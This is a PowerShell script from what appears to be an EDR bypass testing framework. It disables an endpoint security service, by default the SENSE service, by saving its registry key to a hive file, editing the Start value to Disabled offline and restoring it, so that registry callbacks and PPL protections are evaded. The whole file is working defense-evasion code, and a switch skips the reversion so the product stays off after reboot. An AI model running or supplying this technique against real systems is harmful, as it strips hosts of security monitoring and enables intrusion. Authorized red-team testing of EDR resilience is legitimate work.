#==============================================================================
# BP1002.6 - Disable EDR User-Mode Service via Registry Save/Restore
# EDR Bypass Testing Automation Framework
#==============================================================================
# SYNOPSIS
#   Performs EDR bypass by disabling EDR user-mode services using registry
#   save/restore operations to avoid detection from registry notification
#   callbacks and bypass additional PPL protections.
#
# DESCRIPTION
#   This script implements BP-1002.6 technique which uses registry save and
#   restore operations to modify service configuration offline. This approach
#   can bypass registry notification callbacks and may work on PPL-protected
#   services that have additional registry protections. The technique saves
#   the service registry key to a hive file, modifies it offline, and restores
#   it back to the original location.
#   
#   Test Flow:
#   1. Identify target EDR service
#   2. Backup current service registry configuration
#   3. Save service registry key to hive file
#   4. Load hive file under temporary registry location
#   5. Modify Start value in loaded hive to disabled (4)
#   6. Unload modified hive
#   7. Restore modified hive to original service location
#   8. Verify modification was successful
#   9. Revert configuration using backed up hive
#   10. Report results to orchestrator
#
# REQUIREMENTS
#   - Administrative privileges (required for registry save/restore operations)
#   - Windows Vista or later (reg.exe save/restore functionality)
#   - SYSTEM privileges may be required for some operations
#
# EXIT CODES
#   0 = Success (service disabled and reverted successfully)
#   1 = General failure
#   2 = Insufficient privileges
#   3 = Registry save failed
#   4 = Registry modification failed
#   5 = Registry restore failed
#   6 = Registry verification failed
#   7 = Registry reversion failed
#   8 = Target service not found
#   9 = Temporary hive cleanup failed
#==============================================================================

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$TargetService = "SENSE",
    
    [Parameter(Mandatory=$false)]
    [string]$LogPath = "C:\EDRBypassTests\Logs",
    
    [Parameter(Mandatory=$false)]
    [string]$TempPath = "$env:TEMP\EDRBypass",
    
    [Parameter(Mandatory=$false)]
    [switch]$SkipReversion = $false,
    
    [Parameter(Mandatory=$false)]
    [switch]$Verbose = $false
)

# Set strict mode for better error handling
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

#region Constants and Configuration
$TECHNIQUE_ID = "BP1002.6"
$TECHNIQUE_NAME = "Disable EDR User-Mode Service via Registry Save/Restore"
$SCRIPT_VERSION = "1.0.0"
$TIMESTAMP = Get-Date -Format "yyyyMMdd_HHmmss"
$SCRIPT_NAME = "BP1002.6-registry-save-restore"

# Result constants for orchestrator communication
$RESULT_SUCCESS = "BYPASSED"
$RESULT_FAILURE = "FAILED"
$RESULT_DETECTED = "DETECTED"
$RESULT_ERROR = "ERROR"

# Registry constants
$SERVICES_REGISTRY_PATH = "HKLM\SYSTEM\CurrentControlSet\Services"
$TEMP_HIVE_KEY = "HKLM\EDRBypassTemp"
$START_VALUE_NAME = "Start"

# Service startup type constants (registry values)
$SERVICE_START_BOOT = 0        # Boot
$SERVICE_START_SYSTEM = 1      # System  
$SERVICE_START_AUTO = 2        # Automatic
$SERVICE_START_MANUAL = 3      # Manual
$SERVICE_START_DISABLED = 4    # Disabled

# File names for hive operations
$ORIGINAL_HIVE_FILE = "original_service.hiv"
$MODIFIED_HIVE_FILE = "modified_service.hiv"
$BACKUP_HIVE_FILE = "backup_service.hiv"
#endregion

#region Logging Functions
function Initialize-Logging {
    param([string]$LogDirectory)
    
    try {
        if (-not (Test-Path $LogDirectory)) {
            New-Item -Path $LogDirectory -ItemType Directory -Force | Out-Null
        }
        
        $global:LogFile = Join-Path $LogDirectory "$SCRIPT_NAME`_$TIMESTAMP.log"
        $global:ResultFile = Join-Path $LogDirectory "$SCRIPT_NAME`_$TIMESTAMP`_result.json"
        
        Write-Log "=== EDR Bypass Test: $TECHNIQUE_NAME ===" -Level "INFO"
        Write-Log "Technique ID: $TECHNIQUE_ID" -Level "INFO"
        Write-Log "Script Version: $SCRIPT_VERSION" -Level "INFO"
        Write-Log "Target Service: $TargetService" -Level "INFO"
        Write-Log "Temp Path: $TempPath" -Level "INFO"
        Write-Log "Start Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -Level "INFO"
        Write-Log "Log File: $global:LogFile" -Level "INFO"
        Write-Log "Result File: $global:ResultFile" -Level "INFO"
        
        return $true
    }
    catch {
        Write-Error "Failed to initialize logging: $($_.Exception.Message)"
        return $false
    }
}

function Write-Log {
    param(
        [string]$Message,
        [ValidateSet("INFO", "WARN", "ERROR", "DEBUG")]
        [string]$Level = "INFO"
    )
    
    $logEntry = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Message"
    
    # Write to console
    switch ($Level) {
        "ERROR" { Write-Host $logEntry -ForegroundColor Red }
        "WARN"  { Write-Host $logEntry -ForegroundColor Yellow }
        "DEBUG" { if ($Verbose) { Write-Host $logEntry -ForegroundColor Gray } }
        default { Write-Host $logEntry }
    }
    
    # Write to file if available
    if ($global:LogFile) {
        try {
            Add-Content -Path $global:LogFile -Value $logEntry -Encoding UTF8
        }
        catch {
            Write-Warning "Failed to write to log file: $($_.Exception.Message)"
        }
    }
}
#endregion

#region Utility Functions
function Test-AdminPrivileges {
    try {
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        Write-Log "Administrator privileges check: $isAdmin" -Level "DEBUG"
        return $isAdmin
    }
    catch {
        Write-Log "Failed to check administrator privileges: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Test-ServiceExists {
    param([string]$ServiceName)
    
    try {
        $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
        return ($service -ne $null)
    }
    catch {
        return $false
    }
}

function Initialize-TempDirectory {
    param([string]$TempDirectory)
    
    try {
        Write-Log "Initializing temporary directory: $TempDirectory" -Level "DEBUG"
        
        if (-not (Test-Path $TempDirectory)) {
            New-Item -Path $TempDirectory -ItemType Directory -Force | Out-Null
            Write-Log "Created temporary directory" -Level "DEBUG"
        }
        else {
            Write-Log "Temporary directory already exists" -Level "DEBUG"
        }
        
        # Set global paths for hive files
        $global:OriginalHivePath = Join-Path $TempDirectory $ORIGINAL_HIVE_FILE
        $global:ModifiedHivePath = Join-Path $TempDirectory $MODIFIED_HIVE_FILE
        $global:BackupHivePath = Join-Path $TempDirectory $BACKUP_HIVE_FILE
        
        Write-Log "Hive file paths initialized:" -Level "DEBUG"
        Write-Log "  Original: $global:OriginalHivePath" -Level "DEBUG"
        Write-Log "  Modified: $global:ModifiedHivePath" -Level "DEBUG"
        Write-Log "  Backup: $global:BackupHivePath" -Level "DEBUG"
        
        return $true
    }
    catch {
        Write-Log "Failed to initialize temporary directory: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Invoke-RegistryCommand {
    param(
        [string]$Command,
        [string]$Arguments,
        [string]$Description
    )
    
    try {
        Write-Log "Executing registry command: $Description" -Level "DEBUG"
        Write-Log "Command: $Command $Arguments" -Level "DEBUG"
        
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = $Command
        $processInfo.Arguments = $Arguments
        $processInfo.UseShellExecute = $false
        $processInfo.RedirectStandardOutput = $true
        $processInfo.RedirectStandardError = $true
        $processInfo.CreateNoWindow = $true
        
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $processInfo
        
        $started = $process.Start()
        if (-not $started) {
            throw "Failed to start process"
        }
        
        $process.WaitForExit()
        $exitCode = $process.ExitCode
        $stdout = $process.StandardOutput.ReadToEnd()
        $stderr = $process.StandardError.ReadToEnd()
        
        Write-Log "Registry command completed with exit code: $exitCode" -Level "DEBUG"
        
        if ($stdout) {
            Write-Log "STDOUT: $stdout" -Level "DEBUG"
        }
        
        if ($stderr) {
            Write-Log "STDERR: $stderr" -Level "DEBUG"
        }
        
        if ($exitCode -eq 0) {
            Write-Log "Registry command succeeded: $Description" -Level "DEBUG"
            return $true
        }
        else {
            Write-Log "Registry command failed: $Description (Exit Code: $exitCode)" -Level "ERROR"
            if ($stderr) {
                Write-Log "Error details: $stderr" -Level "ERROR"
            }
            return $false
        }
    }
    catch {
        Write-Log "Failed to execute registry command: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Get-ServiceRegistryPath {
    param([string]$ServiceName)
    
    return "$SERVICES_REGISTRY_PATH\$ServiceName"
}

function Get-ServiceStartValue {
    param([string]$ServiceName)
    
    try {
        $servicePath = "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName"
        $startValue = (Get-ItemProperty -Path $servicePath -Name $START_VALUE_NAME -ErrorAction SilentlyContinue).$START_VALUE_NAME
        
        if ($startValue -ne $null) {
            Write-Log "Current Start value for $ServiceName`: $startValue" -Level "DEBUG"
            return $startValue
        }
        else {
            Write-Log "Start value not found for service: $ServiceName" -Level "WARN"
            return $null
        }
    }
    catch {
        Write-Log "Failed to get Start value for service: $($_.Exception.Message)" -Level "ERROR"
        return $null
    }
}

function ConvertTo-StartTypeDescription {
    param([int]$StartValue)
    
    switch ($StartValue) {
        0 { return "Boot" }
        1 { return "System" }
        2 { return "Automatic" }
        3 { return "Manual" }
        4 { return "Disabled" }
        default { return "Unknown($StartValue)" }
    }
}
#endregion

#region Test Result Functions
function Write-TestResult {
    param(
        [string]$Status,
        [string]$Message,
        [hashtable]$Details = @{}
    )
    
    $result = @{
        TechniqueId = $TECHNIQUE_ID
        TechniqueName = $TECHNIQUE_NAME
        Status = $Status
        Message = $Message
        Timestamp = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
        Details = $Details
        ScriptVersion = $SCRIPT_VERSION
    }
    
    try {
        $resultJson = $result | ConvertTo-Json -Depth 3
        if ($global:ResultFile) {
            Set-Content -Path $global:ResultFile -Value $resultJson -Encoding UTF8
        }
        
        Write-Log "=== TEST RESULT ===" -Level "INFO"
        Write-Log "Status: $Status" -Level "INFO"
        Write-Log "Message: $Message" -Level "INFO"
        Write-Log "Result file: $global:ResultFile" -Level "INFO"
        
        # Output for orchestrator pickup
        Write-Output "TECHNIQUE_RESULT:$Status|$Message"
        
    }
    catch {
        Write-Log "Failed to write test result: $($_.Exception.Message)" -Level "ERROR"
    }
}
#endregion

#region Cleanup Functions
function Remove-TempHiveFiles {
    try {
        Write-Log "Cleaning up temporary hive files..." -Level "DEBUG"
        
        $filesToRemove = @($global:OriginalHivePath, $global:ModifiedHivePath, $global:BackupHivePath)
        
        foreach ($file in $filesToRemove) {
            if (Test-Path $file) {
                Remove-Item -Path $file -Force -ErrorAction SilentlyContinue
                Write-Log "Removed temporary file: $file" -Level "DEBUG"
            }
        }
        
        return $true
    }
    catch {
        Write-Log "Failed to cleanup temporary hive files: $($_.Exception.Message)" -Level "WARN"
        return $false
    }
}

function Cleanup-TempRegistryKey {
    try {
        Write-Log "Cleaning up temporary registry key..." -Level "DEBUG"
        
        # Ensure temporary hive is unloaded
        $unloadResult = Invoke-RegistryCommand -Command "reg" -Arguments "unload `"$TEMP_HIVE_KEY`"" -Description "Unload temporary hive (cleanup)"
        
        # Remove registry key if it exists (PowerShell method)
        $tempKeyPath = $TEMP_HIVE_KEY -replace "HKLM\\", "HKLM:\"
        if (Test-Path $tempKeyPath) {
            Remove-Item -Path $tempKeyPath -Recurse -Force -ErrorAction SilentlyContinue
            Write-Log "Removed temporary registry key: $tempKeyPath" -Level "DEBUG"
        }
        
        return $true
    }
    catch {
        Write-Log "Failed to cleanup temporary registry key: $($_.Exception.Message)" -Level "WARN"
        return $false
    }
}
#endregion

#region Main Test Functions
function Backup-OriginalState {
    param([string]$ServiceName)
    
    try {
        Write-Log "Backing up original service state..." -Level "INFO"
        
        # Get current Start value
        $originalStartValue = Get-ServiceStartValue -ServiceName $ServiceName
        
        if ($originalStartValue -eq $null) {
            Write-Log "Failed to retrieve original Start value" -Level "ERROR"
            return $false
        }
        
        # Save original service registry key to backup hive file
        $serviceRegPath = Get-ServiceRegistryPath -ServiceName $ServiceName
        $saveResult = Invoke-RegistryCommand -Command "reg" -Arguments "save `"$serviceRegPath`" `"$global:BackupHivePath`"" -Description "Save original service key to backup hive"
        
        if (-not $saveResult) {
            Write-Log "Failed to save original service registry key" -Level "ERROR"
            return $false
        }
        
        $global:OriginalState = @{
            ServiceName = $ServiceName
            StartValue = $originalStartValue
            StartDescription = ConvertTo-StartTypeDescription -StartValue $originalStartValue
            BackupHivePath = $global:BackupHivePath
            BackupTime = Get-Date
        }
        
        Write-Log "Original service state backed up:" -Level "INFO"
        Write-Log "  Service Name: $ServiceName" -Level "INFO"
        Write-Log "  Start Value: $originalStartValue ($(ConvertTo-StartTypeDescription -StartValue $originalStartValue))" -Level "INFO"
        Write-Log "  Backup Hive: $global:BackupHivePath" -Level "INFO"
        
        return $true
    }
    catch {
        Write-Log "Failed to backup original state: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Invoke-RegistrySaveRestoreBypass {
    param([string]$ServiceName)
    
    try {
        Write-Log "Executing registry save/restore bypass technique..." -Level "INFO"
        
        $serviceRegPath = Get-ServiceRegistryPath -ServiceName $ServiceName
        
        Write-Log "=== STEP 1: Save service registry key ===" -Level "INFO"
        $saveResult = Invoke-RegistryCommand -Command "reg" -Arguments "save `"$serviceRegPath`" `"$global:OriginalHivePath`"" -Description "Save service registry key to hive file"
        
        if (-not $saveResult) {
            Write-Log "Failed to save service registry key" -Level "ERROR"
            return $false
        }
        
        Write-Log "=== STEP 2: Load hive under temporary key ===" -Level "INFO"
        $loadResult = Invoke-RegistryCommand -Command "reg" -Arguments "load `"$TEMP_HIVE_KEY`" `"$global:OriginalHivePath`"" -Description "Load hive under temporary registry key"
        
        if (-not $loadResult) {
            Write-Log "Failed to load hive under temporary key" -Level "ERROR"
            return $false
        }
        
        Write-Log "=== STEP 3: Modify Start value in loaded hive ===" -Level "INFO"
        $modifyResult = Invoke-RegistryCommand -Command "reg" -Arguments "add `"$TEMP_HIVE_KEY`" /v Start /t REG_DWORD /d $SERVICE_START_DISABLED /f" -Description "Set Start value to Disabled in loaded hive"
        
        if (-not $modifyResult) {
            Write-Log "Failed to modify Start value in loaded hive" -Level "ERROR"
            
            # Cleanup: unload the temporary hive
            Invoke-RegistryCommand -Command "reg" -Arguments "unload `"$TEMP_HIVE_KEY`"" -Description "Unload temporary hive (cleanup after failure)"
            return $false
        }
        
        Write-Log "=== STEP 4: Unload modified hive ===" -Level "INFO"
        $unloadResult = Invoke-RegistryCommand -Command "reg" -Arguments "unload `"$TEMP_HIVE_KEY`"" -Description "Unload modified hive"
        
        if (-not $unloadResult) {
            Write-Log "Failed to unload modified hive" -Level "ERROR"
            return $false
        }
        
        Write-Log "=== STEP 5: Restore modified hive to original location ===" -Level "INFO"
        $restoreResult = Invoke-RegistryCommand -Command "reg" -Arguments "restore `"$serviceRegPath`" `"$global:OriginalHivePath`"" -Description "Restore modified hive to original service location"
        
        if (-not $restoreResult) {
            Write-Log "Failed to restore modified hive to original location" -Level "ERROR"
            return $false
        }
        
        Write-Log "Registry save/restore bypass technique executed successfully" -Level "INFO"
        return $true
    }
    catch {
        Write-Log "Failed to execute registry save/restore bypass: $($_.Exception.Message)" -Level "ERROR"
        
        # Cleanup attempt
        Cleanup-TempRegistryKey
        return $false
    }
}

function Test-BypassSuccess {
    param([string]$ServiceName)
    
    try {
        Write-Log "Verifying registry save/restore bypass was successful..." -Level "INFO"
        
        # Small delay to ensure registry changes are applied
        Start-Sleep -Seconds 2
        
        $currentStartValue = Get-ServiceStartValue -ServiceName $ServiceName
        
        if ($currentStartValue -eq $null) {
            Write-Log "Failed to retrieve current Start value for verification" -Level "ERROR"
            return $false
        }
        
        # Check if Start value was set to Disabled (4)
        $isDisabled = ($currentStartValue -eq $SERVICE_START_DISABLED)
        
        Write-Log "Verification results:" -Level "INFO"
        Write-Log "  Current Start value: $currentStartValue ($(ConvertTo-StartTypeDescription -StartValue $currentStartValue))" -Level "INFO"
        Write-Log "  Service disabled: $isDisabled" -Level "INFO"
        
        if ($isDisabled) {
            Write-Log "Registry save/restore bypass verification successful" -Level "INFO"
            Write-Log "Note: Service disable will be effective after system reboot" -Level "INFO"
            return $true
        }
        else {
            Write-Log "Registry save/restore bypass verification failed" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to verify bypass success: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Invoke-StateReversion {
    param([string]$ServiceName)
    
    try {
        Write-Log "Reverting service to original state using backup hive..." -Level "INFO"
        
        $serviceRegPath = Get-ServiceRegistryPath -ServiceName $ServiceName
        $originalStartValue = $global:OriginalState.StartValue
        $originalStartDescription = $global:OriginalState.StartDescription
        
        Write-Log "Restoring original Start value: $originalStartValue ($originalStartDescription)" -Level "INFO"
        
        # Restore original state using backup hive
        $restoreResult = Invoke-RegistryCommand -Command "reg" -Arguments "restore `"$serviceRegPath`" `"$global:BackupHivePath`"" -Description "Restore original service configuration from backup hive"
        
        if (-not $restoreResult) {
            Write-Log "Failed to restore original service configuration" -Level "ERROR"
            return $false
        }
        
        Write-Log "Service state reversion executed successfully" -Level "INFO"
        return $true
    }
    catch {
        Write-Log "Failed to revert service state: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Test-ReversionSuccess {
    param([string]$ServiceName)
    
    try {
        Write-Log "Verifying state reversion was successful..." -Level "INFO"
        
        # Small delay to ensure registry changes are applied
        Start-Sleep -Seconds 2
        
        $currentStartValue = Get-ServiceStartValue -ServiceName $ServiceName
        $originalStartValue = $global:OriginalState.StartValue
        
        if ($currentStartValue -eq $null) {
            Write-Log "Failed to retrieve current Start value for reversion verification" -Level "ERROR"
            return $false
        }
        
        # Check if Start value was restored
        $startValueRestored = ($currentStartValue -eq $originalStartValue)
        
        Write-Log "Reversion verification results:" -Level "INFO"
        Write-Log "  Current Start value: $currentStartValue ($(ConvertTo-StartTypeDescription -StartValue $currentStartValue))" -Level "INFO"
        Write-Log "  Original Start value: $originalStartValue ($(ConvertTo-StartTypeDescription -StartValue $originalStartValue))" -Level "INFO"
        Write-Log "  Start value restored: $startValueRestored" -Level "INFO"
        
        if ($startValueRestored) {
            Write-Log "State reversion verification successful" -Level "INFO"
            return $true
        }
        else {
            Write-Log "State reversion verification failed" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to verify reversion success: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}
#endregion

#region Main Execution
function main {
    try {
        Write-Host "Starting EDR Bypass Test: $TECHNIQUE_NAME" -ForegroundColor Cyan
        
        # Initialize logging
        if (-not (Initialize-Logging -LogDirectory $LogPath)) {
            Write-Error "Failed to initialize logging system"
            exit 1
        }
        
        # Initialize temporary directory
        if (-not (Initialize-TempDirectory -TempDirectory $TempPath)) {
            Write-Error "Failed to initialize temporary directory"
            exit 1
        }
        
        Write-Log "=== PRE-EXECUTION CHECKS ===" -Level "INFO"
        
        # Check administrative privileges
        if (-not (Test-AdminPrivileges)) {
            $errorMsg = "Administrative privileges required for registry save/restore operations"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 2
        }
        Write-Log "Administrative privileges confirmed" -Level "INFO"
        
        # Check if target service exists
        if (-not (Test-ServiceExists -ServiceName $TargetService)) {
            $errorMsg = "Target service '$TargetService' not found on this system"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 8
        }
        Write-Log "Target service '$TargetService' found" -Level "INFO"
        
        Write-Log "=== EXECUTING BYPASS TECHNIQUE ===" -Level "INFO"
        
        # Backup original state
        if (-not (Backup-OriginalState -ServiceName $TargetService)) {
            $errorMsg = "Failed to backup original service state"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 1
        }
        
        # Execute registry save/restore bypass
        if (-not (Invoke-RegistrySaveRestoreBypass -ServiceName $TargetService)) {
            $errorMsg = "Failed to execute registry save/restore bypass technique"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_FAILURE -Message $errorMsg
            
            # Cleanup
            Cleanup-TempRegistryKey
            Remove-TempHiveFiles
            exit 4
        }
        
        # Verify bypass was successful
        if (-not (Test-BypassSuccess -ServiceName $TargetService)) {
            $errorMsg = "Registry save/restore bypass technique failed verification"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_FAILURE -Message $errorMsg
            
            # Cleanup
            Cleanup-TempRegistryKey
            Remove-TempHiveFiles
            exit 6
        }
        
        Write-Log "=== BYPASS TECHNIQUE SUCCESSFUL ===" -Level "INFO"
        Write-Log "Service disabled via registry save/restore - effective after reboot" -Level "INFO"
        
        # Revert state unless explicitly skipped
        if (-not $SkipReversion) {
            Write-Log "=== REVERTING SERVICE STATE ===" -Level "INFO"
            
            if (-not (Invoke-StateReversion -ServiceName $TargetService)) {
                $errorMsg = "Failed to revert service state"
                Write-Log $errorMsg -Level "ERROR"
                Write-TestResult -Status $RESULT_ERROR -Message $errorMsg -Details @{
                    BypassSuccessful = $true
                    ReversionFailed = $true
                }
                
                # Cleanup
                Cleanup-TempRegistryKey
                Remove-TempHiveFiles
                exit 7
            }
            
            if (-not (Test-ReversionSuccess -ServiceName $TargetService)) {
                $errorMsg = "Service state reversion failed verification"
                Write-Log $errorMsg -Level "ERROR"
                Write-TestResult -Status $RESULT_ERROR -Message $errorMsg -Details @{
                    BypassSuccessful = $true
                    ReversionFailed = $true
                }
                
                # Cleanup
                Cleanup-TempRegistryKey
                Remove-TempHiveFiles
                exit 7
            }
            
            Write-Log "Service state successfully reverted" -Level "INFO"
        }
        else {
            Write-Log "Service state reversion skipped as requested" -Level "WARN"
        }
        
        # Cleanup temporary files and registry keys
        Cleanup-TempRegistryKey
        Remove-TempHiveFiles
        
        # Report success
        $successMsg = "BP1002.6 registry save/restore bypass technique executed successfully (service disabled via offline hive modification, effective after reboot)"
        Write-Log $successMsg -Level "INFO"
        Write-TestResult -Status $RESULT_SUCCESS -Message $successMsg -Details @{
            TargetService = $TargetService
            OriginalStartValue = $global:OriginalState.StartValue
            OriginalStartDescription = $global:OriginalState.StartDescription
            BypassApplied = $true
            BypassVerified = $true
            StateReverted = (-not $SkipReversion)
            TempPath = $TempPath
            BypassMethod = "Registry Save/Restore Offline Modification"
            RebootRequired = $true
            HiveFiles = @{
                Original = $global:OriginalHivePath
                Modified = $global:ModifiedHivePath
                Backup = $global:BackupHivePath
            }
        }
        
        Write-Log "=== TEST COMPLETED SUCCESSFULLY ===" -Level "INFO"
        Write-Log "End Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -Level "INFO"
        
        exit 0
        
    }
    catch {
        $errorMsg = "Unhandled exception in main execution: $($_.Exception.Message)"
        Write-Log $errorMsg -Level "ERROR"
        Write-Log "Stack trace: $($_.ScriptStackTrace)" -Level "ERROR"
        Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
        
        # Cleanup
        Cleanup-TempRegistryKey
        Remove-TempHiveFiles
        exit 1
    }
}

# Execute main function
main
#endregion